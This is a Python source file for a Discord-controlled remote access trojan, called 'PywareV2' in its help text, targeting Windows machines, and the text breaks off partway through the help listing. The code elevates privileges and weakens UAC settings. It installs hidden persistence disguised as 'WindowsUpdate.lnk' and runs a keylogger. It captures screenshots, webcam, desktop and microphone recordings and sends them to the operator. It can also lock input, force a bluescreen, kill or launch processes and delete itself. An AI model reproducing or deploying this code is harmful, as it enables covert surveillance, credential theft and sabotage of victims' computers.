import discord
from discord.ext import commands
import os
import platform
import io
from PIL import Image
from mss import mss
import cv2
import atexit
import shutil
import traceback
from datetime import datetime
import time 
from queue import Queue
import win32gui
import win32con
import threading 
import asyncio
import tempfile
import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wav
import wave
from discord.opus import Encoder
from discord import FFmpegOpusAudio
from discord.utils import get
from discord import opus
import pyautogui
from pynput import keyboard, mouse
from screeninfo import get_monitors
import ctypes
import tkinter as tk 
from tkinter import Canvas
import requests
import queue
import sys
import os
from discord.ui import Button, View
from discord.ext.commands import CheckFailure
from functools import wraps
import psutil
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
import subprocess
import webbrowser
import glob
import sqlite3



# --- CONFIGURATION ---
TOKEN = "<Bot-Token>"
SERVER_ID = <SERVER-ID>
COMMAND_CHANNEL_ID = <CHANNEL-ID>
LOG_FILE = os.path.join(tempfile.gettempdir(), "keystrokes.log")
MAX_LOG_ENTRIES = 1000
AUTO_SAVE_INTERVAL = 300
# ---------------------


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():

    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

class MyBot(commands.Bot):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.audio_streams = {}  
        self.is_logging = False          
        self.key_logs = []               
        self.last_save_time = time.time()
        self.listener = None              

bot = MyBot(
    command_prefix="!",
    intents=discord.Intents.all(),
    help_command=None
 )


def get_pc_name():
    """Get PC name with fallback"""
    try:
        if platform.system() == "Windows":
            name = os.getenv("COMPUTERNAME", "UNKNOWN_PC")
        else:
            name = os.getenv("HOSTNAME", "UNKNOWN_PC")
        return name.strip().lower()
    except:
        return "unknown_pc"
    

def setup_autostart():
    """Automatically set up autostart on bot launch"""
    try:
        bot_path = os.path.abspath(sys.argv[0])
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")
        
        # Nur erstellen wenn nicht vorhanden
        if not os.path.exists(shortcut_path):
            # Datei verstecken
            ctypes.windll.kernel32.SetFileAttributesW(bot_path, 2)
            
            # Shortcut erstellen
            vbs_script = f"""
            Set oWS = WScript.CreateObject("WScript.Shell")
            Set oLink = oWS.CreateShortcut("{shortcut_path}")
            oLink.TargetPath = "{bot_path}"
            oLink.WorkingDirectory = "{os.path.dirname(bot_path)}"
            oLink.Save
            """
            
            vbs_file = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
            with open(vbs_file, "w") as f:
                f.write(vbs_script)
            
            subprocess.run(['cscript.exe', '//B', '//Nologo', vbs_file], check=True)
            ctypes.windll.kernel32.SetFileAttributesW(shortcut_path, 2)
            os.remove(vbs_file)
            print("[AUTOSTART] Startup shortcut created")
    except Exception as e:
        print(f"[AUTOSTART ERROR] {e}")

def set_lowest_uac_level():
    try:
        command = """
        $key = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
        Set-ItemProperty -Path $key -Name "ConsentPromptBehaviorAdmin" -Value 0
        Set-ItemProperty -Path $key -Name "PromptOnSecureDesktop" -Value 0
        Set-ItemProperty -Path $key -Name "EnableLUA" -Value 1
        """
        
        subprocess.run(
            ["powershell", "-Command", command],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        return True
    except subprocess.CalledProcessError as e:
        return False


bot = MyBot(
    command_prefix="!",
    intents=discord.Intents.all(),
    help_command=None
)

@bot.event
async def on_ready():
    try:
        channel = bot.get_channel(COMMAND_CHANNEL_ID)
        if channel:
            await channel.send(f"🟢 **System online** - {get_pc_name().upper()} ready!")
        print(f"[SYSTEM] {get_pc_name().upper()} connected")
    except Exception as e:
        print(f"[ERROR] Startup message: {e}")


@bot.command(name="clean")
async def clean_channel(ctx):
    """Quickly delete the last 750 messages (including !clean)"""
    try:

        deleted = await ctx.channel.purge(
            limit=750,
            check=lambda m: not m.pinned and not m.is_system(),
            bulk=True,
            reason="Automatic cleanup"
        )


        msg = await ctx.send(f"⚡ {len(deleted)} messages deleted", delete_after=1)

    except discord.HTTPException as e:
        if e.status == 429:  
            await asyncio.sleep(5)  
            await clean_channel(ctx) 
        else:
            await ctx.send(f"❌ Error: {e.text}", delete_after=5)

@bot.command(name="screenshot")
async def screenshot(ctx, pc_name: str):
    """Capture all monitors"""
    if pc_name.lower() != get_pc_name():
        return
    
    try:
        with mss() as sct:
            for i, monitor in enumerate(sct.monitors[1:], 1):
                sct_img = sct.grab(monitor)
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                
                with io.BytesIO() as output:
                    img.save(output, format="PNG")
                    output.seek(0)
                    await ctx.send(
                        file=discord.File(output, filename=f"monitor_{i}.png"),
                        embed=discord.Embed(
                            title=f"🖥️ Monitor {i} | {get_pc_name().upper()}",
                            color=0x00ff00
                        ).set_image(url=f"attachment://monitor_{i}.png")
                    )
    except Exception as e:
        await ctx.send(f"❌ Screenshot failed: {e}")

@bot.command(name="webcam")
async def webcam(ctx, pc_name: str):
    """Take a webcam photo (only on requested PC)"""
    if pc_name.lower() != get_pc_name().lower():
        return  
    
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            return await ctx.send("❌ Could not read webcam")
        
        _, buffer = cv2.imencode('.jpg', frame)
        await ctx.send(
            file=discord.File(io.BytesIO(buffer.tobytes()), "webcam.jpg"),
            embed=discord.Embed(
                title=f"📸 Webcam {get_pc_name().upper()}",
                color=0x00ff00
            ).set_image(url="attachment://webcam.jpg")
        )
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

def record_webcam_sync(duration: int, output_queue: Queue):
    """Synchronous recording function for thread"""
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        cap.set(cv2.CAP_PROP_FPS, 15)
        
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        temp_file = os.path.join(tempfile.gettempdir(), "webcam_clip.mp4")
        out = cv2.VideoWriter(temp_file, fourcc, 15.0, (640, 480))
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
            time.sleep(0.01)
        
        cap.release()
        out.release()
        output_queue.put(temp_file)
    except Exception as e:
        output_queue.put(f"ERROR:{str(e)}")

@bot.event
async def on_ready():
    try:
        await bot.change_presence(activity=discord.Game(name="by Ole4923"))
        
        channel = bot.get_channel(COMMAND_CHANNEL_ID)
        if channel:
            await channel.send(f"🟢 **System online** - {get_pc_name().upper()} ready!")
        print(f"[SYSTEM] {get_pc_name().upper()} connected")
    except Exception as e:
        print(f"[ERROR] Startup message: {e}")

@bot.command(name="clip")
async def clip(ctx, pc_name: str, duration: int = 5):
    """Create a webcam video (!clip PC-Name [Duration=5])"""
    if pc_name.lower() != get_pc_name():
        return
    
    if duration <= 0:
        return await ctx.send("⚠️ Duration must be >0 seconds")

    msg = await ctx.send(f"🎥 Starting {duration}s recording...")
    
    output_queue = Queue()
    recording_thread = threading.Thread(
        target=record_webcam_sync,
        args=(duration, output_queue),
        daemon=True
    )
    recording_thread.start()
    
    while recording_thread.is_alive():
        await asyncio.sleep(0.5)
    
    result = output_queue.get()
    
    if result.startswith("ERROR:"):
        await msg.edit(content=f"❌ Error: {result[6:]}")
    else:
        try:
            await ctx.send(
                file=discord.File(result, filename="webcam_clip.mp4"),
                embed=discord.Embed(
                    title=f"🎬 {duration}s Clip | {get_pc_name().upper()}",
                    color=0x00ff00
                )
            )
            await msg.delete()
        except Exception as e:
            await msg.edit(content=f"❌ Upload error: {str(e)}")
        finally:
            if os.path.exists(result):
                os.remove(result)


def validate_pc_name(pc_name: str):
    return pc_name.lower() == get_pc_name()

def cleanup_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)


def record_desktop_sync(duration: int, output_queue: Queue):
    try:
        with mss() as sct:
            monitor = sct.monitors[0]  
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            temp_file = os.path.join(tempfile.gettempdir(), f"desktop_{time.time()}.mp4")
            out = cv2.VideoWriter(temp_file, fourcc, 15.0, (monitor['width'], monitor['height']))
            
            start_time = time.time()
            while (time.time() - start_time) < duration:
                frame = np.array(sct.grab(monitor))
                out.write(cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR))
                time.sleep(1/15)
            
            out.release()
            output_queue.put(temp_file)
    except Exception as e:
        output_queue.put(f"ERROR:{str(e)}")

@bot.command(name="recdesktop")
async def recdesktop(ctx, pc_name: str, duration: int = 10):
    """Record desktop (!recdesktop PC-Name [Duration=10])"""
    if not validate_pc_name(pc_name):
        return
    
    if duration <= 0:
        return await ctx.send("⚠️ Duration must be >0 seconds")

    msg = await ctx.send(f"🖥️ Starting {duration}s desktop recording...")
    
    output_queue = Queue()
    thread = threading.Thread(
        target=record_desktop_sync,
        args=(duration, output_queue),
        daemon=True
    )
    thread.start()
    
    while thread.is_alive():
        await asyncio.sleep(0.5)
    
    result = output_queue.get()
    
    if result.startswith("ERROR:"):
        await msg.edit(content=f"❌ Error: {result[6:]}")
    else:
        try:
            await ctx.send(
                file=discord.File(result, filename="desktop_recording.mp4"),
                embed=discord.Embed(
                    title=f"🖥️ {duration}s Desktop | {get_pc_name().upper()}",
                    color=0x3498db
                )
            )
        except Exception as e:
            await msg.edit(content=f"❌ Upload error: {str(e)}")
        finally:
            cleanup_file(result)
        await msg.delete()


def record_microphone_sync(duration: int, output_queue: Queue):
    try:
        sample_rate = 44100
        channels = 1
        temp_file = os.path.join(tempfile.gettempdir(), f"microphone_{time.time()}.wav")
        
        recording = sd.rec(
            int(duration * sample_rate),
            samplerate=sample_rate,
            channels=channels,
            dtype='int16'
        )
        sd.wait()
        
        with wave.open(temp_file, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(sample_rate)
            wf.writeframes(recording.tobytes())
        
        output_queue.put(temp_file)
    except Exception as e:
        output_queue.put(f"ERROR:{str(e)}")

@bot.command(name="recmicrophone")
async def recmicrophone(ctx, pc_name: str, duration: int = 10):
    """Record microphone (!recmicrophone PC-Name [Duration=10])"""
    if not validate_pc_name(pc_name):
        return
    
    if duration <= 0:
        return await ctx.send("⚠️ Duration must be >0 seconds")

    msg = await ctx.send(f"🎤 Starting {duration}s microphone recording...")
    
    output_queue = Queue()
    thread = threading.Thread(
        target=record_microphone_sync,
        args=(duration, output_queue),
        daemon=True
    )
    thread.start()
    
    while thread.is_alive():
        await asyncio.sleep(0.5)
    
    result = output_queue.get()
    
    if result.startswith("ERROR:"):
        await msg.edit(content=f"❌ Error: {result[6:]}")
    else:
        try:
            await ctx.send(
                file=discord.File(result, filename="microphone_recording.wav"),
                embed=discord.Embed(
                    title=f"🎤 {duration}s Microphone | {get_pc_name().upper()}",
                    color=0x3498db
                )
            )
        except Exception as e:
            await msg.edit(content=f"❌ Upload error: {str(e)}")
        finally:
            cleanup_file(result)
        await msg.delete()

class MultiMonitorLocker:
    def __init__(self):
        self.windows = []
        self.lock = threading.Lock()
        self.queue = queue.Queue()
        self.root = None
        self.running = False
        
    def start_tkinter(self):
        """Start Tkinter in main thread"""
        self.root = tk.Tk()
        self.root.withdraw()
        self.running = True
        
        while self.running:
            try:
                task = self.queue.get(timeout=0.1)
                if task[0] == "create":
                    self._create_windows()
                elif task[0] == "destroy":
                    self._destroy_windows()
            except queue.Empty:
                self.root.update()
                
    def _create_windows(self):
        """Create windows (only call from Tkinter thread)"""
        for monitor in get_monitors():
            win = tk.Toplevel(self.root)
            win.overrideredirect(1)
            win.attributes("-topmost", True)
            win.geometry(f"{monitor.width}x{monitor.height}+{monitor.x}+{monitor.y}")
            
            canvas = tk.Canvas(win, bg='black', highlightthickness=0)
            canvas.pack(fill=tk.BOTH, expand=True)
            
            size = min(monitor.width, monitor.height) // 3
            canvas.create_text(
                monitor.width//2,
                monitor.height//2,
                text="🔒",
                font=("Arial", size),
                fill="white"
            )
            
            win.geometry(f"+{monitor.x}+{monitor.y}")
            self.windows.append(win)
        
        self.block_input()
    
    def _destroy_windows(self):
        """Destroy windows (only call from Tkinter thread)"""
        for w in self.windows:
            try:
                w.destroy()
            except:
                pass
        self.windows = []
        self.unblock_input()
    
    def create_lock_windows(self):
        """Request window creation"""
        self.queue.put(("create", None))
    
    def destroy_lock_windows(self):
        """Request window destruction"""
        self.queue.put(("destroy", None))
    
    def block_input(self):
        """Block input"""
        try:
            ctypes.windll.user32.BlockInput(True)
            ctypes.windll.user32.ShowCursor(False)
        except:
            pass
    
    def unblock_input(self):
        """Unblock input"""
        try:
            ctypes.windll.user32.BlockInput(False)
            ctypes.windll.user32.ShowCursor(True)
        except:
            pass
    
    def stop(self):
        """Stop Tkinter thread"""
        self.running = False
        self.destroy_lock_windows()


locker = MultiMonitorLocker()
tk_thread = threading.Thread(target=locker.start_tkinter, daemon=True)
tk_thread.start()

@bot.command(name="lock")
async def lock_all(ctx, pc_name: str):
    if pc_name.lower() != get_pc_name():
        return
    
    try:
        locker.create_lock_windows()
        await ctx.send("🔒 **ALL MONITORS LOCKED**")
    except Exception as e:
        await ctx.send(f"❌ ERROR: {str(e)}")

@bot.command(name="unlock")
async def unlock_all(ctx, pc_name: str):
    if pc_name.lower() != get_pc_name():
        return
    
    try:
        locker.destroy_lock_windows()
        await ctx.send("🟢 **SYSTEM UNLOCKED**")
    except Exception as e:
        await ctx.send(f"⚠️ ERROR: {str(e)}")


import atexit
@atexit.register
def cleanup():
    locker.stop()
    if tk_thread.is_alive():
        tk_thread.join(timeout=1)

@bot.command(name="systeminfo")
async def sysinfo(ctx, pc_name: str):
    """Show detailed system information (CPU, RAM, disks, network, etc.)"""
    if pc_name.lower() != get_pc_name():
        return
    
    try:

        cpu_percent = psutil.cpu_percent(interval=1)
        cpu_cores = psutil.cpu_count(logical=False)
        cpu_threads = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        

        memory = psutil.virtual_memory()
        swap = psutil.swap_memory()
        

        disks = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disks.append({
                    "device": partition.device,
                    "mount": partition.mountpoint,
                    "total": usage.total,
                    "used": usage.used,
                    "free": usage.free,
                    "percent": usage.percent
                })
            except:
                continue
        

        net_io = psutil.net_io_counters()
        net_if = psutil.net_if_addrs()
        

        boot_time = psutil.boot_time()
        users = psutil.users()
        

        embed = discord.Embed(
            title=f"🖥️ Detailed System Information | {get_pc_name().upper()}",
            color=0x3498db,
            timestamp=ctx.message.created_at
        )
        

        cpu_info = (
            f"**Usage:** {cpu_percent}%\n"
            f"**Physical cores:** {cpu_cores}\n"
            f"**Logical cores:** {cpu_threads}\n"
            f"**Current frequency:** {cpu_freq.current:.2f} MHz\n"
            f"**Max frequency:** {cpu_freq.max:.2f} MHz"
        )
        embed.add_field(name="💻 CPU", value=cpu_info, inline=False)
        

        ram_info = (
            f"**Usage:** {memory.percent}%\n"
            f"**Used:** {memory.used / (1024**3):.2f} GB\n"
            f"**Available:** {memory.available / (1024**3):.2f} GB\n"
            f"**Total:** {memory.total / (1024**3):.2f} GB\n"
            f"**Swap:** {swap.used / (1024**3):.2f} GB / {swap.total / (1024**3):.2f} GB"
        )
        embed.add_field(name="🧠 RAM", value=ram_info, inline=False)
        

        disk_info = ""
        for disk in disks:
            disk_info += (
                f"**{disk['device']} ({disk['mount']})**\n"
                f"Used: {disk['used'] / (1024**3):.2f} GB\n"
                f"Free: {disk['free'] / (1024**3):.2f} GB\n"
                f"Total: {disk['total'] / (1024**3):.2f} GB\n"
                f"Usage: {disk['percent']}%\n\n"
            )
        embed.add_field(name="💾 Disks", value=disk_info or "No data", inline=False)
        

        network_info = (
            f"**Sent:** {net_io.bytes_sent / (1024**2):.2f} MB\n"
            f"**Received:** {net_io.bytes_recv / (1024**2):.2f} MB\n"
            f"**Available interfaces:** {len(net_if)}"
        )
        embed.add_field(name="🌐 Network", value=network_info, inline=False)
        
        system_info = (
            f"**OS:** {platform.system()} {platform.release()}\n"
            f"**Uptime:** {time.strftime('%H:%M:%S', time.gmtime(time.time() - boot_time))}\n"
            f"**Active users:** {len(users)}"
        )
        embed.add_field(name="⚙️ System", value=system_info, inline=False)

        embed.set_footer(text=f"Requested by {ctx.author.display_name}")
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error getting system information: {str(e)}")
        print(f"[ERROR] sysinfo: {traceback.format_exc()}")

@bot.command(name="jumpscare")
async def jumpscare(ctx, pc_name: str):
    """Trigger a jumpscare with video and sound effect (optional PC lock)"""
    if pc_name.lower() != get_pc_name():
        return

    try:

        msg = await ctx.send("🔄 Preparing jumpscare...")

        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevel(0.0, None)  
        except Exception as e:
            print(f"[WARN] Could not adjust volume: {e}")

        temp_folder = os.path.join(tempfile.gettempdir(), "discord_bot")
        os.makedirs(temp_folder, exist_ok=True)
        video_path = os.path.join(temp_folder, "jumpscare.mp4")

        if not os.path.exists(video_path):
            video_url = "https://github.com/mategol/PySilon-malware/raw/py-dev/resources/icons/jumpscare.mp4"
            try:
                response = requests.get(video_url, timeout=10)
                with open(video_path, 'wb') as f:
                    f.write(response.content)
            except Exception as e:
                await msg.edit(content=f"❌ Could not load video: {e}")
                return
        

        try:
            try:
                import vlc
                player = vlc.Instance()
                media = player.media_new(video_path)
                player = player.media_player_new()
                player.set_fullscreen(True)
                player.set_media(media)
                player.play()
                

                time.sleep(0.5)
                while not player.is_playing():
                    time.sleep(0.1)
                

                while player.is_playing():
                    time.sleep(0.1)
                    
            except ImportError:

                os.startfile(video_path)
                await asyncio.sleep(1)

                try:
                    import pygetwindow as gw
                    windows = gw.getWindowsWithTitle("jumpscare")
                    if windows:
                        win = windows[0]
                        win.activate()
                        win.maximize()
                except:
                    pass
                
                await asyncio.sleep(5)
                
        except Exception as e:
            await msg.edit(content=f"⚠️ Could not play video: {e}")
        

        finally:
            await msg.edit(content="💀 Jumpscare successfully triggered!")
            
    except Exception as e:
        await ctx.send(f"❌ Critical error: {str(e)}")
        print(f"[ERROR] Jumpscare: {traceback.format_exc()}")

@bot.command(name="bluescreen")
async def bluescreen(ctx, pc_name: str):
    """Trigger a bluescreen (only on requested PC)"""
    if pc_name.lower() != get_pc_name():
        return  
    
    try:
        await ctx.send("⚠️ Triggering Bluescreen...")
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

def get_encryption_key():
    system_id = (get_pc_name() + str(os.getenv("PROCESSOR_IDENTIFIER", ""))).encode()
    return base64.urlsafe_b64encode(system_id.ljust(32)[:32])

def encrypt_data(data: str) -> str:
    try:
        cipher = Fernet(get_encryption_key())
        return cipher.encrypt(data.encode()).decode()
    except:
        return data

def decrypt_data(data: str) -> str:
    try:
        cipher = Fernet(get_encryption_key())
        return cipher.decrypt(data.encode()).decode()
    except:
        return data

def on_press(key):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] "
        
        try:
            log_entry += f"Key: {key.char}"
        except AttributeError:
            special_keys = {
                keyboard.Key.space: "SPACE",
                keyboard.Key.enter: "ENTER",
                keyboard.Key.backspace: "BACKSPACE",
                keyboard.Key.tab: "TAB",
                keyboard.Key.esc: "ESC",
            }
            log_entry += f"Special: {special_keys.get(key, str(key))}"
        
        encrypted_entry = encrypt_data(log_entry)
        bot.key_logs.append(encrypted_entry)
        
        if (len(bot.key_logs) >= MAX_LOG_ENTRIES or 
            (time.time() - bot.last_save_time) >= AUTO_SAVE_INTERVAL):
            save_logs_to_file()
            bot.last_save_time = time.time()
            
    except Exception as e:
        print(f"[Keylogger Error] {e}")

def start_logging():
    try:
        if not bot.is_logging:
            bot.is_logging = True
            with keyboard.Listener(on_press=on_press) as lst:
                bot.listener = lst
                lst.join()
    except Exception as e:
        print(f"[Keylogger Start Error] {e}")
    finally:
        bot.is_logging = False
        save_logs_to_file()

def save_logs_to_file():
    try:
        if not bot.key_logs:
            return
            
        existing_logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                existing_logs = [decrypt_data(line.strip()) for line in f.readlines()]
        
        existing_logs.extend([decrypt_data(log) for log in bot.key_logs])
        
        with open(LOG_FILE, "w") as f:
            for log in existing_logs:
                f.write(encrypt_data(log) + "\n")
                
        bot.key_logs.clear()
        print(f"[Keylogger] Logs saved ({len(existing_logs)} entries)")
        
    except Exception as e:
        print(f"[Keylogger Save Error] {e}")

async def send_logs(ctx):
    try:
        if not os.path.exists(LOG_FILE):
            return await ctx.send("⚠️ No logs available")
            
        temp_file = os.path.join(tempfile.gettempdir(), "decrypted_keystrokes.log")
        
        with open(LOG_FILE, "r") as infile, open(temp_file, "w") as outfile:
            for line in infile:
                outfile.write(decrypt_data(line.strip()) + "\n")
        
        with open(temp_file, "rb") as file:
            await ctx.send(
                f"📝 **Keylogger Logs** ({get_pc_name().upper()})",
                file=discord.File(file, "keystrokes.log")
            )
        
        os.remove(temp_file)
        os.remove(LOG_FILE)
        
    except Exception as e:
        await ctx.send(f"❌ Error sending logs: {str(e)}")
        print(f"[Keylogger Send Error] {traceback.format_exc()}")

@bot.command(name="keyloggerstart")
async def keylogger_start(ctx, pc_name: str):
    if pc_name.lower() != get_pc_name():
        return
        
    if bot.is_logging:
        return await ctx.send("🔴 Keylogger already running", delete_after=5)
    
    logging_thread = threading.Thread(target=start_logging, daemon=True)
    logging_thread.start()
    
    await ctx.send("🟢 Keylogger started", delete_after=5)
    print(f"[Keylogger] Started on {get_pc_name()}")

@bot.command(name="keyloggerstop")
async def keylogger_stop(ctx, pc_name: str):
    if pc_name.lower() != get_pc_name():
        return
        
    if not bot.is_logging:
        return await ctx.send("🔴 Keylogger not active", delete_after=5)
    
    try:
        if bot.listener:
            bot.listener.stop()
        
        await asyncio.sleep(1)
        save_logs_to_file()
        await send_logs(ctx)
        
        await ctx.send("🟢 Keylogger stopped and logs sent", delete_after=5)
        print(f"[Keylogger] Stopped on {get_pc_name()}")
        
    except Exception as e:
        await ctx.send(f"❌ Error stopping: {str(e)}", delete_after=5)
        print(f"[Keylogger Stop Error] {traceback.format_exc()}")

@bot.command(name="keyloggerstatus")
async def keylogger_status(ctx, pc_name: str):
    if pc_name.lower() != get_pc_name():
        return
        
    status = "🟢 ACTIVE" if bot.is_logging else "🔴 INACTIVE"
    log_count = len(bot.key_logs)
    last_save = time.strftime("%H:%M:%S", time.localtime(bot.last_save_time))
    
    embed = discord.Embed(
        title=f"🔑 Keylogger Status | {get_pc_name().upper()}",
        color=0x00ff00 if bot.is_logging else 0xff0000
    )
    embed.add_field(name="Status", value=status, inline=False)
    embed.add_field(name="Unsaved entries", value=str(log_count), inline=True)
    embed.add_field(name="Last save", value=last_save, inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name="stop")
async def shutdown_bot(ctx, pc_name: str):
    """Shut down the bot (locally on this PC)"""
    if pc_name.lower() != get_pc_name():
        return
    
    await ctx.send(f"⏹️ **Bot shutting down on {get_pc_name().upper()}**")
    await bot.close()
    sys.exit()  

@bot.command(name="tasklist")
async def tasklist(ctx, pc_name: str):
    """List all running processes (!tasklist PC-Name)"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                processes.append(f"**PID {proc.info['pid']}**: {proc.info['name']} (User: {proc.info['username']})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        if not processes:
            return await ctx.send("❌ No processes found.")

        chunk_size = 15
        chunks = [processes[i:i + chunk_size] for i in range(0, len(processes), chunk_size)]
        
        for i, chunk in enumerate(chunks, 1):
            embed = discord.Embed(
                title=f"📋 Running Processes (Part {i}) | {get_pc_name().upper()}",
                description="\n".join(chunk),
                color=0x3498db
            )
            await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="killtask")
async def killtask(ctx, pc_name: str, process_name: str):
    """Kill a process by name (!killtask PC-Name ProcessName)"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        killed = 0
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == process_name.lower():
                proc.kill()
                killed += 1

        if killed > 0:
            await ctx.send(f"✅ Killed {killed} instance(s) of `{process_name}`.")
        else:
            await ctx.send(f"❌ No process named `{process_name}` found.")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="startprocess")
async def startprocess(ctx, pc_name: str, process_path: str):
    """Start a process (!startprocess PC-Name "C:\path\to\file.exe")"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        
        process_path = process_path.strip('"\'')
        if not os.path.exists(process_path):
            return await ctx.send(f"❌ File not found: `{process_path}`")

        subprocess.Popen(process_path, shell=True)
        await ctx.send(f"✅ Started `{os.path.basename(process_path)}`.")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="rickroll")
async def rickroll(ctx, pc_name: str):
    """Open Rick Astley in fullscreen (!rickroll PC-Name)"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevel(0.0, None)
        except:
            pass

        url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&autoplay=1"
        webbrowser.open(url)


        try:
            import vlc
            player = vlc.Instance()
            media = player.media_new(url)
            player = player.media_player_new()
            player.set_fullscreen(True)
            player.set_media(media)
            player.play()
        except ImportError:
            pass

        await ctx.send("🎶 **Never gonna give you up...**")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")


@bot.command(name="kill")
async def self_destruct(ctx, pc_name: str):
    """Completely remove bot files including EXE and startup shortcut (!kill PC-Name)"""
    if pc_name.lower() != get_pc_name():
        return

    try:
        # 1. Simple confirmation message
        await ctx.send(
            "⚠️ **WARNING: This will permanently delete ALL bot files!**\n"
            "Type `!confirm` in the next 30 seconds to proceed or do nothing to cancel."
        )

        # 2. Wait for confirmation
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "!confirm"
        
        try:
            await bot.wait_for('message', timeout=30.0, check=check)
        except asyncio.TimeoutError:
            return await ctx.send("✅ Self-destruct canceled (timeout).")

        # 3. Get all file paths
        bot_path = os.path.abspath(sys.argv[0])
        startup_shortcut = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk'
        )

        # 4. Create a VBS deletion script
        vbs_script = f"""
        Set fso = CreateObject("Scripting.FileSystemObject")
        On Error Resume Next
        
        ' Delete files
        fso.DeleteFile "{startup_shortcut}"
        WScript.Sleep 3000
        fso.DeleteFile "{bot_path}"
        fso.DeleteFile WScript.ScriptFullName
        """

        # 5. Save and execute the VBS script
        temp_dir = tempfile.gettempdir()
        vbs_file = os.path.join(temp_dir, "cleanup.vbs")
        
        with open(vbs_file, "w") as f:
            f.write(vbs_script)

        # Run hidden
        subprocess.Popen(
            ['wscript.exe', '//B', vbs_file],
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        # 6. Shutdown bot
        await ctx.send("💀 All bot files will be deleted. Shutting down...")
        await bot.close()
        sys.exit(0)

    except Exception as e:
        await ctx.send(f"❌ FATAL ERROR: {str(e)}")
        print(f"[KILL ERROR] {traceback.format_exc()}")

@bot.command(name="help")
async def help_command(ctx):
    """Show all available commands (only responds from PC with longest uptime)"""
    
    uptimes = {}
    for member in ctx.guild.members:
        if member.bot:
            continue
            

        for role in member.roles:
            if role.name.lower().endswith("-pc"):  
                pc_name = role.name.lower()
                try:

                    uptime = psutil.boot_time()
                    uptimes[pc_name] = uptime
                except:
                    pass
    

    if uptimes:
        longest_pc = min(uptimes, key=uptimes.get)
    else:
        longest_pc = None
    

    if longest_pc and longest_pc != get_pc_name():
        return
    
    embed = discord.Embed(
        title="🤖 PywareV2 - Command Help",
        description="**Admin Remote Control Bot**\nPrefix: `!` | All commands require your PC-Name",
        color=0x3498db
    )

    # System Commands
    embed.add_field(
        name="🖥️ **System Commands**",
        value=(
            "`!systeminfo PC-Name` - Detailed system info\n"
            "`!tasklist PC-Name` - List running processes\n"
            "`!killtask PC-Name ProcessName` - Kill a process\n"
            "`!startprocess PC-Name \"Path\"` - Start an EXE\n"
            "`!disabletaskmanager PC-Name` - Disable Task Manager\n"
            "`!enabletaskmanager PC-Name` - Re-enable it\n"
            "`!cmd PC-Name \"command\"` - Run CMD commands\n"
            "`!powershell PC-Name \"script\"` - Run PowerShell\n"
            "`!stop PC-Name` - Shutdown bot\n"
            "`!kill PC-Name` - Self-destruct bot"
        ),
        inline=False
    )

    # Network/Web Commands
    embed.add_field(
        name="🌐 **Network/Web**",
        value=(
            "`!blockwebsite PC-Name \"URL\"` - Block a site\n"
